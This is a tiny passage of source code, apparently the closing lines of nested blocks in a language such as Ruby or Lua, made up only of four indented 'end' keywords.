			end
		end
	end
end